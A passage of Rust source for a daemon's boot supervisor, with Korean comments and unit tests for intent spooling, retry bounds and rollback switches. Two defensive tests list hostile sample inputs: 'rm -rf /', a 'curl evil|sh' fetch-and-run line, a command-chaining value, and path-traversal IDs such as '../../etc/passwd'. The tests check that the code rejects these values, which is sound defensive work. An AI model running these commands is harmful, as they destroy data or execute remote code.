        std::env::var(ENV_SUPERVISOR).ok().as_deref(),
    );
    if off {
        eprintln!("[cysd] boot-supervisor disabled (CYS_BOOT_GATES=0 또는 CYS_BOOT_SUPERVISOR=0)");
        return;
    }
    // ★(P2 · R3-P2-4 blocker) 생존 플래그 — 태스크 기동 **직전**에만 set 한다. 꺼짐(off)이면
    //   위에서 이미 return 했으므로 영영 미set 이고, `boot.enqueue` arm 은 미set 을 보고 스풀에
    //   쓰지 않는다('등록 성공·발화자 0' 무음 스큐의 봉인 — Daemon::supervisor_alive 주석 정본).
    // ★R4 [1](codex BLOCK · master 심판): **epoch 를 디스크에 내린 뒤에만** 감독자를 연다.
    //   종전에는 생존 플래그를 먼저 세우고 epoch 영속은 태스크 안에서 실패를 삼켰다 — 그러면
    //   lease identity 의 근거가 없는 채로 dispatch 가 열린다. 순서를 뒤집어 영속 성공을
    //   개방 조건으로 만든다. 실패하면 `supervisor_alive` 를 세우지 않으므로 `boot.enqueue`
    //   arm 이 스풀에 쓰지 않고 훅이 종전 legacy 폴백을 탄다(부트 0회가 되지 않는다).
    //   ★부수 효과 하나가 더 옳아졌다: 이 파일 I/O 가 async 블록 밖으로 나와 executor 를
    //   막지 않는다(종전에는 틱 태스크 첫 줄에서 동기 fs 를 했다).
    let dir = spool_dir(&daemon.socket_path);
    let epoch = match bump_boot_epoch(dir.parent().unwrap_or(&dir)) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("[cysd] boot-supervisor: epoch 영속 실패 — 감독자를 열지 않는다 ({e})");
            publish(
                &daemon,
                "boot_supervisor.epoch_persist_failed",
                json!({"error": e, "opened": false,
                       "note": "lease identity 를 못 남기면 열지 않는다 — 훅은 legacy 폴백을 탄다"}),
            );
            return;
        }
    };
    daemon.supervisor_alive.store(true, Ordering::SeqCst);
    tokio::spawn(async move {
        let mut st = SupState::default();
        // ★R3 #7: fence 무장은 **env 로만** 켜진다(기본 꺼짐). 켜는 조건은 §2-7 러너의 CAS·자멸
        //   계약과 그 검체가 닫히는 것이고(B4), 그때 이 스위치 하나로 경로 전체가 살아난다.
        let arm_req = std::env::var(ENV_FENCE_ARMED).ok();
        st.fence_armed = fence_armed_from(arm_req.as_deref(), RUNNER_READINESS);
        // ★B3-5(T3-2): 롤백 스위치도 **여기서 1회** 판독해 틱에 넘긴다(틱이 env 를 읽으면
        //   모든 틱 검체가 프로세스 전역 상태에 묶인다).
        st.boot_v2_off = !boot_v2_enabled_from(std::env::var(ENV_BOOT_V2).ok().as_deref());
        // ★R3 #2: lease identity 의 epoch 는 **데몬 수명당 하나**이고 디스크에 영속한다.
        //   스풀이 아니라 그 부모(상태 디렉터리)에 둔다 — 스풀은 인텐트 스캔·GC 의 대상이다.
        st.epoch = epoch;
        if st.fence_armed {
            eprintln!("[cysd] boot-supervisor: fence ARMED (epoch={})", st.epoch);
        } else if env_asks_arm(arm_req.as_deref()) {
            // ★R4 [4]: 요구했는데 못 켠 것은 **조용하면 안 된다.** 조용하면 운영자는 켰다고
            //   믿고, 그 믿음 위에 다음 판단이 쌓인다. 무엇이 빠졌는지까지 함께 말한다.
            let missing = RUNNER_READINESS.missing();
            eprintln!(
                "[cysd] boot-supervisor: fence 무장 요청을 거절했다 — 빌드 미준비 {missing:?}"
            );
            publish(
                &daemon,
                "boot_supervisor.fence_arm_refused",
                json!({"env": ENV_FENCE_ARMED, "requested": true, "armed": false,
                       "missing": missing,
                       "note": "env 는 의도이고 readiness 는 능력이다 — 능력 없이 켜면 막는 것 없이 표만 흔든다"}),
            );
        }
        loop {
            tokio::time::sleep(Duration::from_secs(SUPERVISOR_INTERVAL_SECS)).await;
            // 패닉 격리 — watchdog 과 같은 규약. 한 틱의 패닉이 감독자를 데몬 수명 내내
            // 조용히 없애면, 그것이 곧 '감독자 없음'(R3) 으로의 회귀다.
            let body = std::panic::AssertUnwindSafe(|| {
                tick_in(
                    &daemon,
                    &dir,
                    &mut st,
                    run_ensure_team,
                    remove_spool_file,
                    now_epoch(),
                );
            });
            if std::panic::catch_unwind(body).is_err() {
                publish(
                    &daemon,
                    "boot_supervisor.tick_panic",
                    json!({"note": "boot supervisor tick panicked; continuing next tick"}),
                );
            }
        }
    });
}

// ══════════════════════════════════════════════════════════════════════════════
#[cfg(test)]
mod tests {
    use super::*;

    /// 실 프로세스를 낳지 않는 실행자 — 항상 성공.
    /// 검체용 인텐트 — v3 필드까지 채운 기본형. 리터럴을 검체마다 두면 필드가 늘 때마다
    /// 전부 고쳐야 하고, 그 수선이 곧 "이 검체가 무엇을 재는지" 를 흐린다.
    fn intent(id: &str) -> BootIntent {
        BootIntent {
            id: id.into(), v: INTENT_SCHEMA_V, action_token: "ensure-team".into(),
            lane: String::new(), surface_id: None, created_at: 1000.0, attempts: 0,
            next_attempt_at: 0.0, reason: String::new(), decl_origin: String::new(),
            claim_rc: None, claim_at: None,
            decl_id: id.into(), executor: EXECUTOR_RUNNER.into(), generation: 0,
            state: IntentState::Pending, terminal: None,
        }
    }

    /// 검체용 enqueue 요청 — 좌석 축만 바꿔 가며 쓴다.
    fn req<'a>(decl_id: &'a str, surface_id: Option<u64>) -> EnqueueReq<'a> {
        EnqueueReq {
            decl_id, action: BootAction::EnsureTeam, lane: "", surface_id,
            reason: "t", decl_origin: "", claim_rc: None, claim_at: None,
            executor: EXECUTOR_RUNNER,
        }
    }

    fn ok_runner(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, RunErr> {
        Ok("test-ok".to_string())
    }
    /// 항상 실패하는 실행자(유계성 시험용 — 재시도 계급).
    fn fail_runner(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, RunErr> {
        Err(RunErr::Retry("test-fail".to_string()))
    }
    /// (P2 · R3-P2-5) 전제 붕괴 계급 실행자 — claim_stale 폐기 경로 시험용.
    fn stale_runner(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, RunErr> {
        Err(RunErr::Retire("claim_stale"))
    }

    /// **절대 지우지 못하는** 제거자 — Windows 읽기전용 속성·백신/생산자 셸이 연 파일을 모사.
    /// 이 표본이 결정론이어야 "지워지지 않아도 이벤트는 유계" 를 기계로 증명할 수 있다.
    fn never_removes(_p: &Path) -> bool {
        false
    }

    fn tmp_daemon(tag: &str) -> Arc<Daemon> {
        crate::delivery::tests::isolate_state_dir_for_thread(tag);
        let dir = std::env::temp_dir().join(format!("cys_bsup_{}_{}", std::process::id(), tag));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        Daemon::new(dir.join("cysd.sock"))
    }

    fn tmp_spool(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("cys_bsup_spool_{}_{}", std::process::id(), tag));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn raw_intent(dir: &Path, id: &str, body: &str) {
        std::fs::write(dir.join(format!("{id}.json")), body).unwrap();
    }

    // ── 순수 코어 진리표 ───────────────────────────────────────────────────────

    /// 롤백 스위치는 **마스터에 접혀 있다** — 축 노브 없이 마스터만으로 꺼져야 한다.
    #[test]
    fn rollback_folds_into_master_switch() {
        assert!(!supervisor_off_from(None, None), "기본은 켜짐(종전 동작=빈 스풀)");
        assert!(supervisor_off_from(Some("0"), None), "마스터 하나로 꺼져야 한다");
        assert!(supervisor_off_from(None, Some("0")), "축 노브도 끈다");
        assert!(supervisor_off_from(Some("0"), Some("1")), "마스터가 축을 이긴다");
        // 느슨한 truthy 를 받아주지 않는다(오타 하나로 안전장치가 뒤집히지 않게).
        assert!(!supervisor_off_from(Some("false"), Some("no")), "엄격 비교");
        assert_eq!(cys::ENV_BOOT_GATES, "CYS_BOOT_GATES");
        assert_eq!(ENV_SUPERVISOR, "CYS_BOOT_SUPERVISOR");
    }

    /// 인텐트가 나르는 것은 **닫힌 enum 토큰**이다 — 명령 문자열은 실행되지 않는다.
    #[test]
    fn unknown_action_token_is_never_executed() {
        assert_eq!(BootAction::parse("ensure-team"), Some(BootAction::EnsureTeam));
        // ★합성 표본 — 이것들이 하나라도 `Some` 이 되면 스풀이 명령 실행 표면이 된다.
        for hostile in [
            "rm -rf /",
            "sh -c 'curl evil|sh'",
            "ensure-team; rm -rf /",
            "EnsureTeam",
            "",
            "ensure_team",
        ] {
            assert_eq!(BootAction::parse(hostile), None, "미지 토큰이 통과했다: {hostile:?}");
            let mut it = intent("x");
            it.action_token = hostile.into();
            it.created_at = 100.0;
            assert_eq!(
                decide(&it, 0, 100.0),
                Disposition::Retire("unknown_action"),
                "미지 토큰이 실행 후보가 됐다: {hostile:?}"
            );
        }
    }

    /// 판정 우선순위 전수 — 형상 → 미지 → 만료 → 예산 → 쿨다운 → 실행.
    #[test]
    fn decide_truth_table() {
        let base = intent("i");
        assert_eq!(decide(&base, 0, 1000.0), Disposition::Run(BootAction::EnsureTeam));
        let mut bad_v = base.clone();
        bad_v.v = INTENT_SCHEMA_V + 1;
        assert_eq!(decide(&bad_v, 0, 1000.0), Disposition::Retire("schema_mismatch"));
        // (P2 · v2) 구 스키마(v1)도 같은 폐기다 — 다운그레이드/업그레이드 스큐 양방향 fail-closed.
        let mut old_v = base.clone();
        old_v.v = 1;
        assert_eq!(decide(&old_v, 0, 1000.0), Disposition::Retire("schema_mismatch"));
        // (P2 · v2) decl_origin 닫힌 토큰 — 인정 토큰은 통과, 미지값은 실행이 아니라 폐기.
        let mut human = base.clone();
        human.decl_origin = DECL_ORIGIN_HOOK_HUMAN.into();
        assert_eq!(decide(&human, 0, 1000.0), Disposition::Run(BootAction::EnsureTeam));
        let mut forged = base.clone();
        forged.decl_origin = "hook-machine".into();
        assert_eq!(
            decide(&forged, 0, 1000.0),
            Disposition::Retire("unknown_decl_origin"),
            "미지 decl_origin 이 실행 후보가 됐다(닫힌 토큰 계약 위반)"
        );
        // 만료가 예산보다 앞이다(늙은 인텐트가 예산을 태우며 프로세스를 낳지 않게).
        assert_eq!(
            decide(&base, 0, 1000.0 + INTENT_MAX_AGE_SECS + 1.0),
            Disposition::Retire("expired")
        );
        assert_eq!(
            decide(&base, MAX_ATTEMPTS, 1000.0),
            Disposition::Retire("attempts_exhausted")
        );
        let mut cooling = base.clone();
        cooling.next_attempt_at = 1200.0;
        assert_eq!(decide(&cooling, 1, 1000.0), Disposition::Wait { until: 1200.0 });
        assert_eq!(decide(&cooling, 1, 1200.0), Disposition::Run(BootAction::EnsureTeam));
    }

    /// 디스크가 거짓말해도 예산은 유계다.
    #[test]
    fn effective_attempts_takes_the_larger_budget() {
        assert_eq!(effective_attempts(0, 3), 3, "디스크 0 · 메모리 3 → 3");
        assert_eq!(effective_attempts(2, 0), 2);
        assert_eq!(effective_attempts(1, 1), 1);
    }

    /// 파일명이 되는 값이므로 경로 탈출이 불가능해야 한다.
    #[test]
    fn sanitize_id_cannot_escape_the_spool() {
        for hostile in ["../../etc/passwd", "a/b", "..", "", "  ", "x\0y"] {
            let s = sanitize_id(hostile);
            assert!(!s.contains('/'), "경로 분리자 잔존: {s:?}");
            assert!(!s.contains('\\'), "경로 분리자 잔존: {s:?}");
            assert!(!s.contains(".."), "상대참조 잔존: {s:?}");
            assert!(!s.is_empty(), "빈 파일명");
        }
        assert_eq!(sanitize_id("boot-master_1"), "boot-master_1", "정상 id 보존");
    }

    // ── 스풀·틱 (합성 표본) ────────────────────────────────────────────────────

    /// 왕복 직렬화 — 적은 것을 그대로 읽는다(스키마 **v2** 왕복: decl_origin·claim{rc,at} 보존).
    #[test]
    fn enqueue_roundtrips() {
        let dir = tmp_spool("roundtrip");
        enqueue_in(
            &dir,
            &EnqueueReq {
                decl_id: "boot-1",
                action: BootAction::EnsureTeam,
                lane: "/tmp/s.sock",
                surface_id: Some(7),
                reason: "hook",
                decl_origin: DECL_ORIGIN_HOOK_HUMAN,
                claim_rc: Some(0),
                claim_at: Some(499.0),
                executor: EXECUTOR_RUNNER,
            },
            500.0,
        )
        .unwrap();
        let scan = scan_spool(&dir, 500.0, 0);
        assert_eq!(scan.intents.len(), 1);
        let it = &scan.intents[0];
        assert_eq!(it.id, "boot-1");
        assert_eq!(it.v, INTENT_SCHEMA_V, "쓰는 버전은 항상 현재 스키마(v3)");
        assert_eq!(it.action_token, "ensure-team");
        assert_eq!(it.surface_id, Some(7));
        assert_eq!(it.attempts, 0);
        assert_eq!(it.decl_origin, DECL_ORIGIN_HOOK_HUMAN, "v2 decl_origin 왕복 소실");
        assert_eq!(it.claim_rc, Some(0), "v2 claim.rc 왕복 소실");
        assert_eq!(it.claim_at, Some(499.0), "v2 claim.at 왕복 소실");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let m = std::fs::metadata(&dir).unwrap().permissions().mode() & 0o777;
            assert_eq!(m, 0o700, "스풀 디렉터리 권한 재강제 실패: {m:o}");
        }
    }

    /// ★H-ENQ-ATOMIC-1(부트 v2 · 명세 §2-5): 같은 `decl_id` 를 여러 번 밀어 넣어도 **파일은
    /// 하나**이고 응답은 `enqueued` 1 + `dedup` n-1 이다.
    ///
    /// 왜 이 축이 중요한가: 종전 id 는 매 호출이 새 값이라 **같은 선언 이벤트의 재전송**(훅
    /// 재실행·중복 배달)이 인텐트를 하나 더 낳았다 = 같은 좌석에 부트 둘. 유일성을 커널
    /// (`O_EXCL`)에 맡기는 것이 이 검체가 지키는 계약이다.
    #[test]
    fn enqueue_is_atomic_on_decl_id() {
        let dir = tmp_spool("atomic");
        let mut enq = 0;
        let mut dedup = 0;
        for _ in 0..8 {
            match enqueue_in(&dir, &req("d-same", Some(7)), 100.0).unwrap() {
                EnqueueOutcome::Enqueued { .. } => enq += 1,
                EnqueueOutcome::Dedup { .. } => dedup += 1,
                other => panic!("예상 밖 귀결: {other:?}"),
            }
        }
        assert_eq!((enq, dedup), (1, 7), "원자 insert 실패 — 재전송이 인텐트를 늘렸다");
        let files: Vec<_> = std::fs::read_dir(&dir)
            .unwrap()
            .flatten()
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| n.ends_with(".json"))
            .collect();
        assert_eq!(files.len(), 1, "파일이 하나가 아니다: {files:?}");
        // decl_id 는 재료가 같으면 같고, 하나만 달라도 갈린다(구분자 없는 연접 사고 차단).
        let a = compute_decl_id("/l.sock", Some(7), "sess", "dig");
        assert_eq!(a, compute_decl_id("/l.sock", Some(7), "sess", "dig"), "결정론 위반");
        assert_ne!(a, compute_decl_id("/l.sock", Some(7), "ses", "sdig"), "구분자 부재 충돌");
        assert_ne!(a, compute_decl_id("/l.sock", Some(8), "sess", "dig"), "좌석 축 미반영");
        assert_eq!(a.len(), 32, "id 길이 계약(파일명 예산)");
    }

    /// ★H-ENQ-SUPERSEDE-1(명세 §2-5 · G1): 같은 좌석에 진행 중 인텐트가 있는데 다른 선언이
    /// 오면 **기록 1 · 실행 0** 이다. 기록조차 안 하면 오너에겐 "선언했는데 흔적이 없다" 가
    /// 되고, 실행까지 하면 같은 좌석에 부트가 둘이 된다 — 그 사이의 유일한 정답이 superseded.
    #[test]
    fn second_declaration_on_a_busy_surface_is_superseded_not_run() {
        let d = tmp_daemon("supersede");
        let dir = tmp_spool("supersede");
        assert!(matches!(
            enqueue_in(&dir, &req("first", Some(7)), 100.0).unwrap(),
            EnqueueOutcome::Enqueued { .. }
        ));
        let out = enqueue_in(&dir, &req("second", Some(7)), 101.0).unwrap();
        match &out {
            EnqueueOutcome::Superseded { by, path } => {
                assert_eq!(by, "first");
                assert!(
                    path.to_string_lossy().ends_with(DONE_SUFFIX),
                    "superseded 기록이 즉시 .done 으로 닫히지 않았다: {path:?}"
                );
            }
            other => panic!("superseded 가 아니다: {other:?}"),
        }
        // ★음성 대조 — 실행은 **한 번뿐**이다(두 인텐트가 다 돌면 좌석에 부트가 둘).
        let mut st = SupState::default();
        let n = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 200.0);
        assert_eq!(n, 1, "superseded 인텐트까지 실행됐다 — G1 위반");
        // 다른 좌석의 선언은 superseded 대상이 아니다(과잉 억제 차단).
        assert!(matches!(
            enqueue_in(&dir, &req("other-seat", Some(9)), 102.0).unwrap(),
            EnqueueOutcome::Enqueued { .. }
        ));
    }

    /// ★H-ENQ-REDECLARE-1(시뮬 **T1-3** — 명세만 읽고 짰다면 났을 사고): 오너가 같은 프롬프트를
    /// **실패 후 다시** 치면 그것은 정당한 재선언이다.
    ///
    /// 파일명이 `<decl_id>.json` 이고 terminal 파일이 GC 될 때까지 남아 있으면 `O_EXCL` 이
    /// 실패해 `dedup` 으로 접힌다 = **재선언이 삼켜진다**(G1 위반). terminal 전이 시점의
    /// `.done` rename 이 그것을 막는다 — 이 검체가 그 한 줄을 지킨다.
    #[test]
    fn redeclaration_after_terminal_is_not_swallowed_as_dedup() {
        let dir = tmp_spool("redeclare");
        let first = enqueue_in(&dir, &req("same-decl", Some(7)), 100.0).unwrap();
        assert!(matches!(first, EnqueueOutcome::Enqueued { .. }));
        // 앞 인텐트를 종착시킨다(러너가 완주했거나 감독자가 접은 상태).
        let it = intent("same-decl");
        close_intent(&dir, &it, Terminal::new(TerminalKind::Completed, "", ""), 150.0).unwrap();
        // ★같은 decl_id 로 다시 선언 — dedup 이 아니라 새 인텐트여야 한다.
        let again = enqueue_in(&dir, &req("same-decl", Some(7)), 200.0).unwrap();
        assert!(
            matches!(again, EnqueueOutcome::Enqueued { .. }),
            "정당한 재선언이 삼켜졌다(T1-3 회귀): {again:?}"
        );
        // ★그리고 닫힌 인텐트는 **다시 실행되지 않는다**(.done 이 남아 있어도).
        let closed = intent("x");
        let mut term = closed.clone();
        term.state = IntentState::Terminal;
        term.terminal = Some(Terminal::new(TerminalKind::Completed, "", ""));
        assert_eq!(decide(&term, 0, 1000.0), Disposition::Retire("already_terminal"));
    }

    /// ★H-TERMINAL-1(명세 §3-2): terminal 대수는 **11종 전수**이고 철자 왕복이 항등이며,
    /// 감독자의 구 `Retire` 사유가 **빠짐없이** 이 표로 합류한다.
    #[test]
    fn terminal_algebra_is_total_and_roundtrips() {
        assert_eq!(TerminalKind::ALL.len(), 11, "명세 §3-2 의 종착 수와 다르다");
        let mut seen = std::collections::BTreeSet::new();
        for k in TerminalKind::ALL {
            assert!(seen.insert(k.as_str()), "철자 중복: {}", k.as_str());
            assert_eq!(TerminalKind::parse(k.as_str()), Some(k), "왕복 실패: {}", k.as_str());
        }
        assert_eq!(TerminalKind::parse("made-up"), None, "미지 토큰이 통과했다(fail-closed 위반)");
        // 구 폐기 사유 전수 — 하나도 표 밖으로 새지 않는다.
        for why in [
            "schema_mismatch", "unknown_action", "unknown_decl_origin", "expired",
            "attempts_exhausted", "claim_stale", "no_surface", "already_terminal",
        ] {
            let k = TerminalKind::from_retire_reason(why);
            assert!(TerminalKind::ALL.contains(&k), "{why} 가 표 밖으로 샜다");
        }
        assert_eq!(TerminalKind::from_retire_reason("expired"), TerminalKind::Expired);
        assert_eq!(
            TerminalKind::from_retire_reason("attempts_exhausted"),
            TerminalKind::AttemptsExhausted
        );
        assert_eq!(TerminalKind::from_retire_reason("claim_stale"), TerminalKind::Aborted);
        // 상태 enum 도 같은 계약(미지 = None → 호출부가 pending 으로 승격).
        for st in [IntentState::Pending, IntentState::Running, IntentState::Terminal] {
            assert_eq!(IntentState::parse(st.as_str()), Some(st));
        }
        assert_eq!(IntentState::parse("halfway"), None);
    }

    /// ★schema 2 **승격 판독**(명세 §5): 구 데몬이 남긴 인텐트는 폐기가 아니라 기본값 승격이다.
    /// 업그레이드 순간에 대기 중이던 오너 선언을 죽이지 않는 것이 이 계약의 목적이다.
    #[test]
    fn schema_two_intents_are_promoted_not_retired() {
        let dir = tmp_spool("promote");
        raw_intent(
            &dir,
            "legacy",
            r#"{"v":2,"action":"ensure-team","created_at":0.0,"surface_id":7,"decl_origin":"hook-human"}"#,
        );
        let scan = scan_spool(&dir, 1.0, 0);
        assert_eq!(scan.intents.len(), 1, "구 스키마가 스캔에서 사라졌다");
        let it = &scan.intents[0];
        assert_eq!(it.v, INTENT_SCHEMA_V_LEGACY);
        assert_eq!(it.decl_id, "legacy", "decl_id 부재 → 파일명으로 승격되어야 한다");
        assert_eq!(it.state, IntentState::Pending, "state 부재 → 가장 보수적인 pending");
        assert_eq!(it.generation, 0);
        assert!(it.terminal.is_none());
        assert!(it.executor.is_empty(), "executor 는 디스패치 시점에 채운다(순수 판독 유지)");
        // ★핵심: **실행 후보로 남는다**(폐기가 아니다).
        assert_eq!(decide(it, 0, 1.0), Disposition::Run(BootAction::EnsureTeam));
        // 음성 대조 — 미래 스키마·v1 은 여전히 fail-closed.
        let mut future = intent("f");
        future.v = INTENT_SCHEMA_V + 1;
        assert_eq!(decide(&future, 0, 1.0), Disposition::Retire("schema_mismatch"));
        let mut v1 = intent("o");
        v1.v = 1;
        assert_eq!(decide(&v1, 0, 1.0), Disposition::Retire("schema_mismatch"));
    }

    /// ★롤백 스위치 판독 — **기본 꺼짐**(2026-09-05 · master 판정 · IG-33 §5).
    ///
    /// ★종전 기대치는 '기본 켜짐' 이었다(명세 §5 "기본 1"). v0.14.30 이 부트 v2 를 **휴면으로
    /// 싣기로** 확정되면서 전제가 바뀌었다 — 러너(B4-R)·자동 arm·레인 락이 없는 상태에서 기본
    /// 켜짐이면 사용자가 켠 적 없는 경로가 기본값으로 돈다. **약화가 아니라 전제 교체**이고,
    /// 명세와의 divergence 는 master 판정으로 등재됐다.
    #[test]
    fn boot_v2_switch_defaults_off_and_only_explicit_turns_it_on() {
        assert!(!boot_v2_enabled_from(None), "미설정이 켜짐이면 opt-in 이 아니다");
        assert!(!boot_v2_enabled_from(Some("")), "빈값이 켜짐이면 안 된다");
        assert!(!boot_v2_enabled_from(Some("yes")), "미지값이 켜짐이면 안 된다(켜는 쪽만 명시적)");
        assert!(!boot_v2_enabled_from(Some("0")), "0 은 당연히 꺼짐");
        assert!(boot_v2_enabled_from(Some("1")));
        assert!(boot_v2_enabled_from(Some("true")));
        assert!(boot_v2_enabled_from(Some(" 1 ")), "공백은 다듬어 받는다");
        // 극성 대조 — 두 스위치를 헷갈리면 롤백이 정반대로 동작한다.
        assert!(supervisor_off_from(Some("0"), None));
        assert!(!supervisor_off_from(None, None));
    }

    /// ★B6 음성 대조(master 제약) — **토글을 켜도 fence 는 arm 되지 않는다.**
    ///
    /// v0.14.30 은 부트 v2 를 휴면으로 싣는다. 그런데 토글만 켜지고 fence 가 반쯤 발효하면
    /// 사용자는 켰다고 믿는데 실제로는 아무 일도 일어나지 않거나 — 더 나쁘게는 절반만
    /// 일어난다. 두 축이 **독립**임을 못 박는다: 스위치는 '감독자 경로를 쓰는가' 이고
    /// fence 무장은 '러너 계약이 빌드에 있는가' 다.
    ///
    /// ★'켜지지 않음' 과 '필드 부재' 를 접지 않는다: 여덟 칸은 **존재하고 전부 false** 이며,
    /// `missing()` 이 그 여덟을 **이름으로** 돌려준다. 정보가 없는 것이 아니라 없다고 말할 수
    /// 있는 상태다.
    #[test]
    fn turning_the_v2_toggle_on_does_not_arm_the_fence() {
        assert!(boot_v2_enabled_from(Some("1")), "전제: 토글이 켜졌다");
        // B4-R 부재 — 여덟 칸이 전부 false 다(부재가 아니라 false 다).
        assert!(!RUNNER_READINESS.ready(), "토글과 무관하게 빌드는 준비되지 않았다");
        assert_eq!(
            RUNNER_READINESS.missing().len(),
            8,
            "준비 안 된 칸을 이름으로 말하지 못한다 — '켜지지 않음' 과 '정보 없음' 이 같아진다: {:?}",
            RUNNER_READINESS.missing()
        );
        // ★그리고 env 로 무장을 요구해도 켜지지 않는다 — 두 축이 AND 이기 때문이다.
        assert!(
            !fence_armed_from(Some("1"), RUNNER_READINESS),
            "토글이 켜진 상태에서 fence 가 무장했다 — 러너 없이 반쯤 발효한다"
        );
    }

    /// ★유계성 — 실패하는 실행자에 대해 디스패치 총량이 `MAX_ATTEMPTS` 를 넘지 않는다.
    /// (틱을 100회 돌려도 프로세스는 3번만 태어난다.)
    #[test]
    fn retry_is_bounded_by_max_attempts() {
        let d = tmp_daemon("bounded");
        let dir = tmp_spool("bounded");
        enqueue_in(&dir, &req("b", None), 0.0).unwrap();
        let mut st = SupState::default();
        let mut total = 0usize;
        let mut now = 1.0;
        for _ in 0..100 {
            total += tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, now);
            now += 5.0; // 쿨다운을 계속 넘겨 준다 — 그래도 유계여야 한다.
        }
        assert_eq!(total, MAX_ATTEMPTS as usize, "재시도가 유계가 아니다(폭주 경로)");
        assert!(
            !intent_path(&dir, "b").exists(),
            "예산 소진 인텐트가 스풀에 남았다 — 다음 세대가 다시 태운다"
        );
    }

    /// ★읽기전용 스풀(디스크가 예산을 못 올림)에서도 유계여야 한다 — 메모리측 예산 단독 시험.
    #[test]
    fn budget_is_bounded_even_when_disk_never_persists() {
        let d = tmp_daemon("nopersist");
        let dir = tmp_spool("nopersist");
        let mut st = SupState::default();
        let mut total = 0usize;
        let mut now = 1.0;
        for _ in 0..50 {
            // 매 틱 인텐트를 attempts=0 으로 되살린다 = 디스크 예산이 영원히 오르지 않는 상황.
            raw_intent(
                &dir,
                "z",
                &format!(
                    r#"{{"v":{INTENT_SCHEMA_V},"action":"ensure-team","lane":"","surface_id":null,
                        "created_at":0.0,"attempts":0,"next_attempt_at":0.0,"reason":"t"}}"#
                ),
            );
            total += tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, now);
            now += 5.0;
        }
        assert!(
            total <= MAX_ATTEMPTS as usize,
            "디스크 예산이 오르지 않는 상황에서 {total}회 디스패치 — 메모리측 유계가 없다(폭주)"
        );
    }

    /// ★codex BLOCK 회귀(2026-09-05) — **같은 데몬 수명에서 2회 부트가 둘 다 나간다.**
    ///
    /// 이 검체가 결함을 실제로 잡은 실물이다(재현 프로브 승격). 수리 전 실측은
    /// n1=1 / n2=0 이었고 2차 인텐트는 pending 인 채 6틱(t=2..202) 동안 한 번도 나가지 못했다 —
    /// **기본 경로가 첫 부트 뒤 멎는다**는 뜻이다. 근인은 성공 갈래가 예약을 놓지 않는데
    /// python 자식의 exit 을 관측할 주체가 없어 슬롯을 회수할 사람이 아무도 없었던 것이다
    /// (해제 넷 중 어느 것도 이 경로에 닿지 않는다).
    #[test]
    fn two_boots_in_one_daemon_lifetime_both_dispatch() {
        let d = tmp_daemon("twoboots");
        let dir = tmp_spool("twoboots");
        let mut st = SupState::default();
        // 출하 기본값 — `CYS_BOOT_V2` 미설정(opt-in)이라 v2 는 꺼져 있다.
        st.boot_v2_off = true;

        // handlers 는 레인을 빈 문자열로 고정한다(레인 자기 고정) — **모든 제품 부트가 같은
        // 레인**이라 이 충돌은 보편적이다.
        let mut r1 = req("boot1", None);
        r1.lane = "";
        enqueue_in(&dir, &r1, 0.0).unwrap();
        assert_eq!(
            tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0),
            1,
            "1차 부트가 나가지 않았다 — 전제가 무너졌으니 이 검체는 아무것도 재지 못한다"
        );
        // ★이 단언은 전제까지 함께 잰다: 슬롯이 비었다는 것은 성공 갈래가 실행 주체를
        //   **python 으로 보고** 놓았다는 뜻이다(v2 가 꺼져 있으면 재스탬프가 그렇게 만든다).
        //   재스탬프가 안 됐다면 슬롯이 남아 여기서 걸린다 — 엉뚱한 경로를 재고 초록이 되는 일이 없다.
        assert!(
            d.boot_run_active.lock().unwrap().is_empty(),
            "python 런의 슬롯이 남았다 — 데몬이 그 자식의 exit 을 관측하지 않으므로 회수할 주체가 없다"
        );

        let mut r2 = req("boot2", None);
        r2.lane = "";
        enqueue_in(&dir, &r2, 0.0).unwrap();
        assert_eq!(
            tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 2.0),
            1,
            "같은 데몬 수명의 2차 부트가 나가지 않았다 — 사용자는 첫 부트 뒤 다시 부트할 수 없다"
        );
    }

    /// ★음성 대조 — **러너 경로의 예약은 유지된다.** 놓을 것과 놓지 말 것을 가른다.
    ///
    /// 위 수리의 계약은 "관측 주체가 없으면 놓는다" 이지 **"항상 놓는다" 가 아니다.**
    /// 러너(B4-R)는 `boot.exit_ack` 로 자기 종료를 신고하는 계약을 지므로 그 슬롯은 ACK 까지
    /// 유지돼야 한다 — 미리 놓으면 레인당 실행 ≤1(G1)이 무너지고 덮어쓰기 회귀(codex R7 [2])가
    /// 되돌아온다. 즉 러너 경로에서 2차가 거절되는 것은 결함이 아니라 **정상**이다.
    #[test]
    fn the_runner_path_keeps_its_reservation_until_exit_ack() {
        let d = tmp_daemon("runnerkeep");
        let dir = tmp_spool("runnerkeep");
        let mut st = SupState::default();
        st.boot_v2_off = false; // v2 켜짐 = 실행 주체가 러너다(재스탬프 없음)

        let mut r1 = req("run1", None);
        r1.lane = "";
        enqueue_in(&dir, &r1, 0.0).unwrap();
        assert_eq!(
            tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0),
            1,
            "러너 경로 1차가 나가지 않았다 — 전제 붕괴"
        );
        assert_eq!(
            d.boot_run_active.lock().unwrap().len(),
            1,
            "러너 런의 예약이 사라졌다 — exit ACK 로 회수할 슬롯을 미리 놓으면 레인당 실행 ≤1 이 무너진다"
        );
        let mut r2 = req("run2", None);
        r2.lane = "";
        enqueue_in(&dir, &r2, 0.0).unwrap();
        assert_eq!(
            tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 2.0),
            0,
            "러너가 점유 중인 레인에 2차가 나갔다 — 덮어쓰기 회귀(codex R7 [2])다"
        );
    }

    /// 틱당 디스패치 상한 — 스풀 홍수가 한 틱에 프로세스 떼를 낳지 않는다.
    #[test]
    fn dispatch_per_tick_is_capped() {
        let d = tmp_daemon("flood");
        let dir = tmp_spool("flood");
